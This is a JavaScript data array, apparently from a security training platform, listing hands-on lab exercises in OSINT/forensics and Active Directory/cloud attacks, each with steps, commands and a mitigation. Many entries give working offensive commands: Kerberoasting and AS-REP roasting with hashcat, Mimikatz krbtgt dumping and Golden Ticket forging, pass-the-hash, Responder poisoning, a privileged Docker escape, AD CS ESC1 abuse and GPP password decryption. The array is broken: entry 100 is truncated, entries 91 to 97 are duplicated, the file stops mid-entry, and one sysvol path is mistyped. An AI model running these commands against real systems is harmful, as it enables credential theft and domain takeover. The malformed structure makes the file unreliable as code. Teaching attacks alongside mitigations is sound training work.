            commands: "Analyze execution paths:\nGet-Process svchost | Select-Object Path",
            mitigation: "Monitor system executions starting from unexpected folders (e.g. Temp directory)."
        }
    },

    // OSINT & Forensics (69-84)
    {
        id: 69,
        title: "EXIF Geolocation Extraction",
        category: "osint-forensics",
        difficulty: "beginner",
        duration: "1-2 Hours",
        xp: 50,
        description: "Extract hidden EXIF metadata from image uploads to discover camera variables, creator details, and GPS coordinates.",
        guide: {
            objective: "Retrieve geolocation details and camera settings from target image files.",
            labSetup: "Python environment; exiftool utility installed locally.",
            steps: [
                "Locate target image files (JPEG/TIFF) containing metadata.",
                "Analyze target files using Exiftool to list metadata parameters.",
                "Locate GPS coordinates (latitude and longitude) in metadata fields.",
                "Map coordinates to search maps to find geolocations."
            ],
            commands: "Install Exiftool:\nsudo apt install exiftool\n\nExtract image metadata:\nexiftool photo.jpg\n\nFilter GPS coordinates:\nexiftool -gps* photo.jpg",
            mitigation: "Sanitize files and remove metadata before sharing images online."
        }
    },
    {
        id: 70,
        title: "Whois and DNS History Map",
        category: "osint-forensics",
        difficulty: "beginner",
        duration: "2 Hours",
        xp: 50,
        description: "Perform passive OSINT scans on target domains to map ownership, registration details, and host history.",
        guide: {
            objective: "Perform passive reconnaissance on domains to map target assets.",
            labSetup: "Public domain search portals; whois tool installed locally.",
            steps: [
                "Query target domains using whois tools to find registrar details.",
                "Search DNS history records to map historical IP changes.",
                "Query subdomains to discover hidden server interfaces.",
                "Document IP ranges for active target scans."
            ],
            commands: "Query whois records:\nwhois target.com\n\nResolve DNS targets:\ndig target.com ANY",
            mitigation: "Use domain privacy protection settings to hide registrant email and contact details from whois databases."
        }
    },
    {
        id: 71,
        title: "Email Header Spoofing Audit",
        category: "osint-forensics",
        difficulty: "intermediate",
        duration: "2-3 Hours",
        xp: 75,
        description: "Analyze email headers to identify spoofed origins, verify routing paths, and inspect security records (SPF, DKIM, DMARC).",
        guide: {
            objective: "Analyze email headers to identify spoofed emails and detect phishing sources.",
            labSetup: "Receive a test email; download raw header files.",
            steps: [
                "Open raw header files in text editors.",
                "Analyze Received lines to map the transmission path.",
                "Verify routing details against SPF records.",
                "Check DKIM signatures and DMARC parameters to confirm authentication status."
            ],
            commands: "Check DNS TXT records:\ndig target.com TXT | grep -E 'spf|dmarc'",
            mitigation: "Configure SPF, DKIM, and DMARC policies on mail systems to prevent unauthorized email spoofing."
        }
    },
    {
        id: 72,
        title: "Username Hunting via Sherlock",
        category: "osint-forensics",
        difficulty: "beginner",
        duration: "2 Hours",
        xp: 50,
        description: "Search username availability across 400+ online platforms using Sherlock to profile target users.",
        guide: {
            objective: "Profile target users by finding active accounts matching usernames across multiple platforms.",
            labSetup: "Python setup; Sherlock tool cloned locally.",
            steps: [
                "Clone the Sherlock repository from GitHub.",
                "Install dependency packages using pip.",
                "Run Sherlock sweeps with target username arguments.",
                "Document matches and analyze pages to gather information."
            ],
            commands: "Clone Sherlock:\ngit clone https://github.com/sherlock-project/sherlock.git\ncd sherlock\npip install -r requirements.txt\n\nSearch usernames:\npython3 sherlock.py [username]",
            mitigation: "Avoid reusing usernames across public platforms."
        }
    },
    {
        id: 73,
        title: "PCAP Malicious User Agent Check",
        category: "osint-forensics",
        difficulty: "intermediate",
        duration: "3 Hours",
        xp: 75,
        description: "Audit network PCAP captures using tshark to identify user agent strings linked to malware.",
        guide: {
            objective: "Identify infected hosts in network captures by analyzing HTTP request headers.",
            labSetup: "tshark tool installed; network PCAP capture file containing HTTP traffic.",
            steps: [
                "Open tshark on target PCAP files.",
                "Filter captures to isolate HTTP request headers.",
                "Extract user agent strings from packets.",
                "Verify extracted values against databases of known malicious user agents."
            ],
            commands: "Tshark filter commands:\ntshark -r traffic.pcap -Y \"http.request\" -T fields -e ip.src -e http.user_agent | sort -u",
            mitigation: "Block non-standard user agent strings at the network gateway."
        }
    },
    {
        id: 74,
        title: "Windows Event Log Forensics",
        category: "osint-forensics",
        difficulty: "intermediate",
        duration: "3 Hours",
        xp: 75,
        description: "Analyze security event logs in Windows using PowerShell to trace unauthorized login attempts.",
        guide: {
            objective: "Identify unauthorized system access attempts by analyzing Event Logs.",
            labSetup: "A Windows testing system; enable logon auditing.",
            steps: [
                "Open Windows PowerShell with administrative privileges.",
                "Query security logs filtering for logon events (Event ID 4624).",
                "Query logs filtering for failed login events (Event ID 4625).",
                "Extract source IPs and usernames to identify potential attack patterns."
            ],
            commands: "Get failed logins via PowerShell:\nGet-EventLog -LogName Security -InstanceId 4625 | Select-Object TimeGenerated, ReplacementStrings",
            mitigation: "Establish centralized logging systems, and configure alerts to trigger on repeated logon failures."
        }
    },
    {
        id: 75,
        title: "Shodan Queries for ICS Ports",
        category: "osint-forensics",
        difficulty: "intermediate",
        duration: "2-3 Hours",
        xp: 75,
        description: "Use Shodan search queries to identify internet-exposed industrial control system (ICS) ports.",
        guide: {
            objective: "Identify exposed critical infrastructure services by performing Shodan queries.",
            labSetup: "Access to a Shodan account.",
            steps: [
                "Locate common industrial control ports (e.g. Modbus port 502).",
                "Search Shodan using specific filters (e.g. port:502).",
                "Analyze query results to identify host locations and protocols.",
                "Document exposed setups for security auditing."
            ],
            commands: "Shodan query filters:\nport:502 \"product:Modbus\"\nport:47808 \"protocol:bacnet\"",
            mitigation: "Remove critical infrastructure services from direct internet exposure. Enforce VPN authentication."
        }
    },
    {
        id: 76,
        title: "Maltego Graph Reconnaissance",
        category: "osint-forensics",
        difficulty: "intermediate",
        duration: "3 Hours",
        xp: 75,
        description: "Perform passive OSINT sweeps in Maltego to map target infrastructure and relationships.",
        guide: {
            objective: "Map relationships between target websites, IP addresses, domains, and personnel.",
            labSetup: "Maltego tool installed locally.",
            steps: [
                "Open Maltego and create a new graph project.",
                "Add a target domain element to the graph.",
                "Run transforms to discover IP addresses, nameservers, and subdomains.",
                "Analyze relationships and export reports."
            ],
            commands: "Launch Maltego:\nmaltego",
            mitigation: "Ensure public infrastructure databases do not expose sensitive corporate records."
        }
    },
    {
        id: 77,
        title: "Autopsy Disk Image Analysis",
        category: "osint-forensics",
        difficulty: "advanced",
        duration: "4-5 Hours",
        xp: 100,
        description: "Perform forensic analysis of disk image files in Autopsy to recover deleted files and inspect registries.",
        guide: {
            objective: "Analyze target disk images to recover data and identify indicators of compromise.",
            labSetup: "Autopsy tool installed; raw disk image file (.img/.dd).",
            steps: [
                "Launch Autopsy and create a new case mapping.",
                "Import the target disk image file as the data source.",
                "Run ingest modules to index files, keywords, and metadata.",
                "Analyze target directories to recover deleted files."
            ],
            commands: "Start Autopsy:\nautopsy",
            mitigation: "Apply full disk encryption policies on all enterprise systems to prevent physical data extractions."
        }
    },
    {
        id: 78,
        title: "Forensics on Browser History",
        category: "osint-forensics",
        difficulty: "intermediate",
        duration: "3 Hours",
        xp: 75,
        description: "Recover and analyze SQLite databases of web browser history files from target system folders.",
        guide: {
            objective: "Analyze target user activity by recovering and inspecting browser history databases.",
            labSetup: "System folders containing Google Chrome or Firefox history databases.",
            steps: [
                "Locate the path of browser databases (History SQLite file).",
                "Open database files using DB Browser for SQLite.",
                "Write SQL queries to filter history tables.",
                "Extract visited URLs, timestamps, and search queries."
            ],
            commands: "SQL history query:\nSELECT url, title, datetime(last_visit_time/1000000-11644473600,'unixepoch') FROM urls ORDER BY last_visit_time DESC LIMIT 100;",
            mitigation: "Enforce browser data protection settings, and use secure deletion tools."
        }
    },
    {
        id: 79,
        title: "Phishing Email Code Analysis",
        category: "osint-forensics",
        difficulty: "beginner",
        duration: "2 Hours",
        xp: 50,
        description: "Analyze HTML source code of phishing emails to identify domain aliases and tracker scripts.",
        guide: {
            objective: "Detect malicious links and indicators of compromise inside phishing emails.",
            labSetup: "Raw HTML source code from a test phishing email.",
            steps: [
                "Open the email source code in a text editor.",
                "Inspect anchor tags (href) to check if visible names match target paths.",
                "Identify image links used by attackers for email tracking.",
                "Verify source domains using URL reputation databases."
            ],
            commands: "Inspect links via terminal:\ngrep -o -E 'href=\"[^\"]*\"' email.eml",
            mitigation: "Enforce email protection filters at the gateway, and train users on email verification."
        }
    },
    {
        id: 80,
        title: "JADX Android APK Decompilation",
        category: "osint-forensics",
        difficulty: "intermediate",
        duration: "3 Hours",
        xp: 75,
        description: "Decompile Android application packages (APKs) using JADX to analyze source code and find hardcoded keys.",
        guide: {
            objective: "Analyze Android applications to discover logic structures and secret configurations.",
            labSetup: "JADX tool installed locally; target APK file.",
            steps: [
                "Decompile target APK files using JADX.",
                "Browse through source packages and review Java files.",
                "Search code for keywords like secret, key, token, or password.",
                "Verify API endpoints and map network operations."
            ],
            commands: "Decompile APK via CLI:\njadx -d /output/dir/ app.apk",
            mitigation: "Ensure applications use code obfuscation (e.g. ProGuard). Never store secrets or API keys in application source code."
        }
    },
    {
        id: 81,
        title: "GitHub Secret Harvesting Scan",
        category: "osint-forensics",
        difficulty: "beginner",
        duration: "2 Hours",
        xp: 50,
        description: "Scan public GitHub repositories using TruffleHog to detect leaked API keys, tokens, and credentials.",
        guide: {
            objective: "Locate sensitive credentials leaked in public source repositories.",
            labSetup: "TruffleHog tool installed locally; target repository URL.",
            steps: [
                "Install TruffleHog scanner tool.",
                "Run scans targeting specific repository URLs.",
                "Review findings to check for credential patterns.",
                "Implement key rotation strategies for leaked secrets."
            ],
            commands: "Install TruffleHog via pip:\npip install trufflehog\n\nScan public repository:\ntrufflehog git https://github.com/user/repo",
            mitigation: "Deploy pre-commit hooks to scan code files for secrets before pushing changes to remote repositories."
        }
    },
    {
        id: 82,
        title: "Document Metadata Cleanup Tool",
        category: "osint-forensics",
        difficulty: "beginner",
        duration: "2 Hours",
        xp: 50,
        description: "Sanitize public document files using metadata cleanup scripts to prevent information leakage.",
        guide: {
            objective: "Remove author names, system paths, and software details from document files before publication.",
            labSetup: "Python environment; target document files (PDF/DOCX).",
            steps: [
                "Install metadata cleanup packages.",
                "Write scripts that load document files.",
                "Remove metadata variables from target files.",
                "Save modified files and verify metadata is deleted."
            ],
            commands: "Remove PDF metadata via exiftool:\nexiftool -all= document.pdf",
            mitigation: "Enforce automated document sanitization rules inside organizational file upload pipelines."
        }
    },
    {
        id: 83,
        title: "Crypto Wallet Tracker",
        category: "osint-forensics",
        difficulty: "intermediate",
        duration: "3 Hours",
        xp: 75,
        description: "Analyze transactions of target cryptocurrency wallets using blockchain explorers to track asset movements.",
        guide: {
            objective: "Map transaction flows and identify destination addresses of target crypto wallets.",
            labSetup: "A target cryptocurrency wallet address.",
            steps: [
                "Open blockchain explorers (e.g., Etherscan, Blockchain.com).",
                "Query target wallet addresses.",
                "Trace transfer history to identify transaction flows.",
                "Identify relationships with exchange platforms."
            ],
            commands: "Query Ethereum balances via curl:\ncurl -s 'https://api.etherscan.io/api?module=account&action=balance&address=[Wallet_Address]'",
            mitigation: "Ensure transactions comply with regulatory audits and address tracking mechanisms."
        }
    },
    {
        id: 84,
        title: "Steganography Hiding & Extractions",
        category: "osint-forensics",
        difficulty: "beginner",
        duration: "2 Hours",
        xp: 50,
        description: "Hide secret messages inside target image files using steghide, and extract them using passphrases.",
        guide: {
            objective: "Establish covert communication channels by hiding messages in image files.",
            labSetup: "Steghide tool installed; target image file; text file containing secret message.",
            steps: [
                "Install steghide packages.",
                "Embed secret messages in image files with passphrase configurations.",
                "Transfer modified image files to destination systems.",
                "Extract hidden messages using decryption keys."
            ],
            commands: "Embed secret message:\nsteghide embed -cf image.jpg -ef secret.txt\n\nExtract hidden message:\nsteghide extract -sf image.jpg",
            mitigation: "Verify file parameters using image analyzers, and scan for abnormalities in image byte structures."
        }
    },

    // Active Directory & Cloud (85-100)
    {
        id: 85,
        title: "Kerberoasting Attack & Mitigations",
        category: "ad-cloud",
        difficulty: "advanced",
        duration: "4 Hours",
        xp: 100,
        description: "Request Service Principal Name (SPN) tickets from Active Directory controllers, export them, and crack passwords offline.",
        guide: {
            objective: "Acquire domain password hashes by querying SPN service setups in Active Directory.",
            labSetup: "Active Directory domain target; domain user account credentials; hashcat tool.",
            steps: [
                "Query domain controllers to find accounts configured with Service Principal Names.",
                "Request TGS ticket variables for target service accounts using PowerShell.",
                "Export ticket hashes to files using Mimikatz or Impacket.",
                "Crack exported hashes offline using dictionary attacks in Hashcat."
            ],
            commands: "Query SPNs via Impacket:\nimpacket-GetUserSPNs [Domain]/[User]:[Password] -request -outputfile krb.hash\n\nCrack hashes in Hashcat:\nhashcat -m 13100 krb.hash wordlist.txt",
            mitigation: "Use long, complex passwords for service accounts. Implement Group Managed Service Accounts (gMSA)."
        }
    },
    {
        id: 86,
        title: "LLMNR Poisoning with Responder",
        category: "ad-cloud",
        difficulty: "intermediate",
        duration: "3 Hours",
        xp: 75,
        description: "Capture domain credentials on local networks by poisoning LLMNR and NBT-NS broadcast requests using Responder.",
        guide: {
            objective: "Intercept Active Directory password hashes by poisoning local name resolution queries.",
            labSetup: "Active Directory domain network space; client systems requesting non-existent servers.",
            steps: [
                "Verify active network interfaces on the attacker computer.",
                "Launch Responder specifying target network interfaces.",
                "Trigger failed name queries from client machines (e.g., typing invalid file paths).",
                "Capture NTLM hash outputs from Responder logs."
            ],
            commands: "Launch Responder:\nsudo responder -I eth0 -rdw",
            mitigation: "Disable LLMNR and NBT-NS protocols on all domain systems via Group Policy Objects (GPO)."
        }
    },
    {
        id: 87,
        title: "AWS S3 Bucket Leak Audit",
        category: "ad-cloud",
        difficulty: "beginner",
        duration: "2 Hours",
        xp: 50,
        description: "Scan public AWS S3 buckets to identify open directory settings and download leaked documents.",
        guide: {
            objective: "Discover exposed cloud storage buckets to secure target assets.",
            labSetup: "AWS CLI tools; standard bucket name lists.",
            steps: [
                "Install AWS CLI utilities locally.",
                "Configure dummy credentials to bypass configuration checks.",
                "Scan target bucket paths to discover exposed files.",
                "Query bucket lists to check download permissions."
            ],
            commands: "Query public S3 bucket:\naws s3 ls s3://[Bucket_Name] --no-sign-request\n\nDownload file from public bucket:\naws s3 cp s3://[Bucket_Name]/secret.txt . --no-sign-request",
            mitigation: "Configure AWS S3 bucket blocking rules to prevent public access configurations."
        }
    },
    {
        id: 88,
        title: "Golden Ticket AD Exploit",
        category: "ad-cloud",
        difficulty: "expert",
        duration: "5 Hours",
        xp: 150,
        description: "Extract Active Directory krbtgt account hashes to forge Golden Tickets, gaining persistent domain access.",
        guide: {
            objective: "Forge Ticket Granting Tickets (TGT) to maintain administrative control over Active Directory domains.",
            labSetup: "Active Directory domain space; acquire domain admin privileges on target domain controllers.",
            steps: [
                "Extract krbtgt account hashes using Mimikatz on domain controllers.",
                "Extract the target domain SID value.",
                "Forge custom Golden Tickets using krbtgt hashes and domain SIDs.",
                "Load forged tickets into memory using Kerberos tools and access services."
            ],
            commands: "Dump krbtgt hash via Mimikatz:\nlsadump::lsa /inject /name:krbtgt\n\nForge Golden Ticket:\nkerberos::golden /user:Administrator /domain:[Domain] /sid:[Domain_SID] /krbtgt:[krbtgt_Hash] /ptt",
            mitigation: "Implement strong monitoring around krbtgt account changes. Reset krbtgt account credentials periodically (two-cycle changes)."
        }
    },
    {
        id: 89,
        title: "AWS IAM Privilege Escalation",
        category: "ad-cloud",
        difficulty: "advanced",
        duration: "4 Hours",
        xp: 100,
        description: "Audit AWS IAM users to detect policy misconfigurations that allow self-elevation of account privileges.",
        guide: {
            objective: "Elevate account privileges on AWS by exploiting misconfigured IAM permissions.",
            labSetup: "AWS account setup; IAM user account configured with weak permissions (e.g. CreateNewPolicyVersion).",
            steps: [
                "Inspect user permissions using AWS CLI tools.",
                "Identify misconfigurations (e.g. users allowed to modify policy versions).",
                "Create new policy versions that grant administrative privileges.",
                "Apply the new policy versions to user accounts and verify admin capabilities."
            ],
            commands: "Create administrative policy version:\naws iam create-policy-version --policy-arn [Policy_ARN] --policy-document file://admin-policy.json --set-as-default",
            mitigation: "Implement least privilege models for IAM user policies, and monitor changes to security configurations."
        }
    },
    {
        id: 90,
        title: "BloodHound AD Path Scan",
        category: "ad-cloud",
        difficulty: "intermediate",
        duration: "3 Hours",
        xp: 75,
        description: "Use BloodHound and SharpHound to scan Active Directory domains and map attack paths to Domain Admin.",
        guide: {
            objective: "Identify attack paths to Domain Admin inside Active Directory networks.",
            labSetup: "Active Directory domain target; domain user account access.",
            steps: [
                "Run SharpHound gatherers on compromised domain systems.",
                "Export generated directory data zip files to attacker systems.",
                "Import data logs into the BloodHound database portal.",
                "Analyze relationship paths to identify shortcuts to Domain Admin."
            ],
            commands: "Execute SharpHound gatherer:\n.\\SharpHound.exe -c All\n\nLaunch neo4j console:\nsudo neo4j start",
            mitigation: "Audit Active Directory relationship permissions, clean up legacy groups, and restrict administrative access."
        }
    },
    {
        id: 91,
        title: "Pass-the-Hash Credential Abuse",
        category: "ad-cloud",
        difficulty: "intermediate",
        duration: "3 Hours",
        xp: 75,
        description: "Access remote systems in Active Directory networks using NTLM password hashes without knowing plain-text passwords.",
        guide: {
            objective: "Access remote target nodes by passing NTLM hashes directly to authentication services.",
            labSetup: "Active Directory domain; target server with shared access credentials; compromised NTLM password hash.",
            steps: [
                "Identify systems on the network running SMB services.",
                "Use Mimikatz to inject NTLM hashes into active memory spaces.",
                "Open elevated terminal commands mapping to target systems.",
                "Access administrative directories on target hosts (e.g., dir \\\\[Target]\\c$)."
            ],
            commands: "Mimikatz Pass-the-Hash execution:\nsekurlsa::pth /user:Administrator /domain:[Domain] /ntlm:[NTLM_Hash] /run:cmd.exe",
            mitigation: "Restrict local administrator accounts from connecting over network interfaces. Implement LAPS configurations."
        }
    },
    {
        id: 92,
        title: "Azure AD Information Disclosure",
        category: "ad-cloud",
        difficulty: "intermediate",
        duration: "3 Hours",
        xp: 75,
        description: "Audit Azure AD tenants to identify guest account configurations that expose user directories to external domains.",
        guide: {
            objective: "Identify security configurations that expose Azure AD directories to external users.",
            labSetup: "Azure portal access; guest account login.",
            steps: [
                "Log into Azure portals using guest credentials.",
                "Attempt to search directories to list user records.",
                "Verify if guest user permissions allow listing other account profiles.",
                "Document configuration gaps for security auditing."
            ],
            commands: "List users via Azure CLI:\naz ad user list --query \"[].{name:displayName, mail:mail}\"",
            mitigation: "Configure guest user permissions in Azure AD to restrict directory search access."
        }
    },
    {
        id: 93,
        title: "AWS Network Security Group Audit",
        category: "ad-cloud",
        difficulty: "beginner",
        duration: "2 Hours",
        xp: 50,
        description: "Audit AWS EC2 instances to identify security groups and NACL configurations exposing management ports.",
        guide: {
            objective: "Identify and resolve network access gaps on AWS EC2 configurations.",
            labSetup: "Access to AWS console; EC2 instances running with open security group configurations.",
            steps: [
                "List active AWS security groups using CLI tools.",
                "Identify instances configured with open public access rules (e.g. 0.0.0.0/0).",
                "Locate exposed management ports (e.g., SSH port 22 or RDP port 3389).",
                "Apply restrictive access rules to limit connection sources to specific administrative IPs."
            ],
            commands: "List security groups via CLI:\naws ec2 describe-security-groups --query \"SecurityGroups[*].{Name:GroupName,Rules:IpPermissions}\"",
            mitigation: "Avoid configuring open public access rules for administrative ports. Enforce bastion host connections."
        }
    },
    {
        id: 94,
        title: "AS-REP Roasting Weak Passwords",
        category: "ad-cloud",
        difficulty: "advanced",
        duration: "3-4 Hours",
        xp: 100,
        description: "Identify domain users configured without Kerberos pre-authentication, query their AS-REP hashes, and crack them offline.",
        guide: {
            objective: "Harvest domain password hashes by querying Kerberos pre-authentication settings.",
            labSetup: "Active Directory domain; domain user account access; Hashcat tool.",
            steps: [
                "Scan Active Directory domain accounts to locate users configured with 'Do not require Kerberos preauthentication'.",
                "Query domain controllers to request AS-REP hashes for target accounts.",
                "Export response hashes to local files.",
                "Crack hashes offline using dictionary attacks in Hashcat."
            ],
            commands: "Query AS-REP hashes via Impacket:\nimpacket-GetNPUsers [Domain]/[User] -request -no-pass -format hashcat -outfile asrep.hash\n\nCrack hashes in Hashcat:\nhashcat -m 18200 asrep.hash wordlist.txt",
            mitigation: "Enforce Kerberos pre-authentication across all domain user accounts. Implement strong password policies."
        }
    },
    {
        id: 95,
        title: "Docker Container Escape Audit",
        category: "ad-cloud",
        difficulty: "advanced",
        duration: "4 Hours",
        xp: 100,
        description: "Exploit Docker container configurations like privileged execution modes or writable sockets to escape to host terminals.",
        guide: {
            objective: "Gain command execution access on host systems from inside Docker container environments.",
            labSetup: "A Docker host running container targets configured with privileged access flags.",
            steps: [
                "Verify container privileges by checking for disk devices in dev listings.",
                "Locate the host's root storage directory (e.g. /dev/sda1).",
                "Mount the host disk to a directory inside the container.",
                "Access host storage directories from inside the container to verify escape capabilities."
            ],
            commands: "Mount host drive from container:\nmount /dev/sda1 /mnt\nchroot /mnt /bin/sh",
            mitigation: "Avoid running Docker containers with privileged flags. Secure access to Docker socket files."
        }
    },
    {
        id: 96,
        title: "Kubernetes API Misconfig Audit",
        category: "ad-cloud",
        difficulty: "advanced",
        duration: "4 Hours",
        xp: 100,
        description: "Exploit open Kubernetes API servers with anonymous access enabled to list pods and extract secrets.",
        guide: {
            objective: "Access sensitive cluster data by exploiting misconfigured Kubernetes API servers.",
            labSetup: "Kubernetes cluster setup; API server configured with anonymous access enabled.",
            steps: [
                "Verify API endpoint accessibility using curl requests.",
                "Query pod listings using kubectl tools.",
                "Locate database connection details and secret tokens inside configuration files.",
                "Document vulnerabilities for security auditing."
            ],
            commands: "Query API server via curl:\ncurl -k -s https://[API_Server_IP]:6443/api/v1/namespaces\n\nQuery pods via kubectl:\nkubectl --server=https://[API_Server_IP]:6443 get pods",
            mitigation: "Disable anonymous authorization on Kubernetes API servers. Implement robust Role-Based Access Control (RBAC)."
        }
    },
    {
        id: 97,
        title: "AD CS Certificate Abuse (ESC1)",
        category: "ad-cloud",
        difficulty: "expert",
        duration: "5 Hours",
        xp: 150,
        description: "Exploit Active Directory Certificate Services (AD CS) template misconfigurations (ESC1) to request certificate variables and impersonate admin accounts.",
        guide: {
            objective: "Acquire domain administrative privileges by exploiting vulnerable certificate templates.",
            labSetup: "Active Directory domain with AD CS installed; template configured with CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT permissions.",
            steps: [
                "Scan target domains to locate vulnerable certificate templates.",
                "Request certificates representing target users (e.g. Domain Administrator) using Certify.",
                "Request Kerberos TGT tickets using the certificate credentials.",
                "Access domain controller directories to verify administrative access."
            ],
            commands: "Query templates via Certify:\n.\\Certify.exe find /vulnerable\n\nRequest certificate:\n.\\Certify.exe request /ca:[CA_Name] /template:[Template] /altname:Administrator\n\nRequest TGT:\nRubeus.exe asktgt /user:Administrator /certificate:[Base64_Cert] /ptt",
            mitigation: "Disable template options that allow user-supplied subjects in high-privilege certificate configurations."
        }
    },
    {
        id: 98,
        title: "AWS Lambda Hardcoded Secrets",
        category: "ad-cloud",
        difficulty: "beginner",
        duration: "2 Hours",
        xp: 50,
        description: "Scan AWS Lambda function configurations and code backups to find exposed credentials and hardcoded passwords.",
        guide: {
            objective: "Locate hardcoded API keys and secrets in cloud function files.",
            labSetup: "AWS portal access; Lambda function configurations containing secret environment variables.",
            steps: [
                "Query Lambda functions using AWS CLI tools.",
                "Download Lambda deployment code packages.",
                "Search code files for secret strings.",
                "Retrieve credentials from configuration parameters."
            ],
            commands: "List Lambda functions:\naws lambda list-functions\n\nRetrieve environment variables:\naws lambda get-function --function-name [Function_Name]",
            mitigation: "Avoid hardcoding credentials in Lambda function files; use AWS Secrets Manager or KMS encryption instead."
        }
    },
    {
        id: 99,
        title: "Active Directory GPP Decryption",
        category: "ad-cloud",
        difficulty: "intermediate",
        duration: "2-3 Hours",
        xp: 75,
        description: "Decrypt passwords stored in Active Directory Group Policy Preference files using public AES keys.",
        guide: {
            objective: "Recover plain-text credentials from Active Directory Group Policy files.",
            labSetup: "Domain controller environment; local domain user credentials; GPP configuration XML containing cpassword.",
            steps: [
                "Browse domain controller Sysvol shares to locate Groups Policy XML files.",
                "Locate password parameters (cpassword) in configuration records.",
                "Decrypt the password parameter using the public AES key.",
                "Access target systems using the recovered credentials."
            ],
            commands: "Search GPP XML files:\ngrep -rn \"cpassword\" /let/lib/samba/sysvol/\n\nDecrypt GPP hash:\ngpp-decrypt [cpassword_string]",
            mitigation: "Decommission Group Policy Preferences containing local administrator password mappings (apply MS14-025)."
        }
    },
    {
        id: 100,
        title: "CloudTrail Logs Audit",
        category: "ad-cloud",
        difficulty: "intermediate",
    },
    {
        id: 91,
        title: "Pass-the-Hash Credential Abuse",
        category: "ad-cloud",
        difficulty: "intermediate",
        duration: "3 Hours",
        xp: 75,
        description: "Access remote systems in Active Directory networks using NTLM password hashes without knowing plain-text passwords.",
        guide: {
            objective: "Access remote target nodes by passing NTLM hashes directly to authentication services.",
            labSetup: "Active Directory domain; target server with shared access credentials; compromised NTLM password hash.",
            steps: [
                "Identify systems on the network running SMB services.",
                "Use Mimikatz to inject NTLM hashes into active memory spaces.",
                "Open elevated terminal commands mapping to target systems.",
                "Access administrative directories on target hosts (e.g. dir \\\\[Target]\\c$)."
            ],
            commands: "Mimikatz Pass-the-Hash execution:\nsekurlsa::pth /user:Administrator /domain:[Domain] /ntlm:[NTLM_Hash] /run:cmd.exe",
            mitigation: "Restrict local administrator accounts from connecting over network interfaces. Implement LAPS configurations."
        }
    },
    {
        id: 92,
        title: "Azure AD Information Disclosure",
        category: "ad-cloud",
        difficulty: "intermediate",
        duration: "3 Hours",
        xp: 75,
        description: "Audit Azure AD tenants to identify guest account configurations that expose user directories to external domains.",
        guide: {
            objective: "Identify security configurations that expose Azure AD directories to external users.",
            labSetup: "Azure portal access; guest account login.",
            steps: [
                "Log into Azure portals using guest credentials.",
                "Attempt to search directories to list user records.",
                "Verify if guest user permissions allow listing other account profiles.",
                "Document configuration gaps for security auditing."
            ],
            commands: "List users via Azure CLI:\naz ad user list --query \"[].{name:displayName, mail:mail}\"",
            mitigation: "Configure guest user permissions in Azure AD to restrict directory search access."
        }
    },
    {
        id: 93,
        title: "AWS Network Security Group Audit",
        category: "ad-cloud",
        difficulty: "beginner",
        duration: "2 Hours",
        xp: 50,
        description: "Audit AWS EC2 instances to identify security groups and NACL configurations exposing management ports.",
        guide: {
            objective: "Identify and resolve network access gaps on AWS EC2 configurations.",
            labSetup: "Access to AWS console; EC2 instances running with open security group configurations.",
            steps: [
                "List active AWS security groups using CLI tools.",
                "Identify instances configured with open public access rules (e.g. 0.0.0.0/0).",
                "Locate exposed management ports (e.g., SSH port 22 or RDP port 3389).",
                "Apply restrictive access rules to limit connection sources to specific administrative IPs."
            ],
            commands: "List security groups via CLI:\naws ec2 describe-security-groups --query \"SecurityGroups[*].{Name:GroupName,Rules:IpPermissions}\"",
            mitigation: "Avoid configuring open public access rules for administrative ports. Enforce bastion host connections."
        }
    },
    {
        id: 94,
        title: "AS-REP Roasting Weak Passwords",
        category: "ad-cloud",
        difficulty: "advanced",
        duration: "3-4 Hours",
        xp: 100,
        description: "Identify domain users configured without Kerberos pre-authentication, query their AS-REP hashes, and crack them offline.",
        guide: {
            objective: "Harvest domain password hashes by querying Kerberos pre-authentication settings.",
            labSetup: "Active Directory domain; domain user account access; Hashcat tool.",
            steps: [
                "Scan Active Directory domain accounts to locate users configured with 'Do not require Kerberos preauthentication'.",
                "Query domain controllers to request AS-REP hashes for target accounts.",
                "Export response hashes to local files.",
                "Crack hashes offline using dictionary attacks in Hashcat."
            ],
            commands: "Query AS-REP hashes via Impacket:\nimpacket-GetNPUsers [Domain]/[User] -request -no-pass -format hashcat -outfile asrep.hash\n\nCrack hashes in Hashcat:\nhashcat -m 18200 asrep.hash wordlist.txt",
            mitigation: "Enforce Kerberos pre-authentication across all domain user accounts. Implement strong password policies."
        }
    },
    {
        id: 95,
        title: "Docker Container Escape Audit",
        category: "ad-cloud",
        difficulty: "advanced",
        duration: "4 Hours",
        xp: 100,
        description: "Exploit Docker container configurations like privileged execution modes or writable sockets to escape to host terminals.",
        guide: {
            objective: "Gain command execution access on host systems from inside Docker container environments.",
            labSetup: "A Docker host running container targets configured with privileged access flags.",
            steps: [
                "Verify container privileges by checking for disk devices in dev listings.",
                "Locate the host's root storage directory (e.g. /dev/sda1).",
                "Mount the host disk to a directory inside the container.",
                "Access host storage directories from inside the container to verify escape capabilities."
            ],
            commands: "Mount host drive from container:\nmount /dev/sda1 /mnt\nchroot /mnt /bin/sh",
            mitigation: "Avoid running Docker containers with privileged flags. Secure access to Docker socket files."
        }
    },
    {
        id: 96,
        title: "Kubernetes API Misconfig Audit",
        category: "ad-cloud",
        difficulty: "advanced",
        duration: "4 Hours",
        xp: 100,
        description: "Exploit open Kubernetes API servers with anonymous access enabled to list pods and extract secrets.",
        guide: {
            objective: "Access sensitive cluster data by exploiting misconfigured Kubernetes API servers.",
            labSetup: "Kubernetes cluster setup; API server configured with anonymous access enabled.",
            steps: [
                "Verify API endpoint accessibility using curl requests.",
                "Query pod listings using kubectl tools.",
                "Locate database connection details and secret tokens inside configuration files.",
                "Document vulnerabilities for security auditing."
            ],
            commands: "Query API server via curl:\ncurl -k -s https://[API_Server_IP]:6443/api/v1/namespaces\n\nQuery pods via kubectl:\nkubectl --server=https://[API_Server_IP]:6443 get pods",
            mitigation: "Disable anonymous authorization on Kubernetes API servers. Implement robust Role-Based Access Control (RBAC)."
        }
    },
    {
        id: 97,
        title: "AD CS Certificate Abuse (ESC1)",
        category: "ad-cloud",
        difficulty: "expert",
        duration: "5 Hours",
        xp: 150,
        description: "Exploit Active Directory Certificate Services (AD CS) template misconfigurations (ESC1) to request certificate variables and impersonate admin accounts.",
        guide: {
            objective: "Acquire domain administrative privileges by exploiting vulnerable certificate templates.",
            labSetup: "Active Directory domain with AD CS installed; template configured with CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT permissions.",
            steps: [
                "Scan target domains to locate vulnerable certificate templates.",
                "Request certificates representing target users (e.g. Domain Administrator) using Certify.",
                "Request Kerberos TGT tickets using the certificate credentials.",
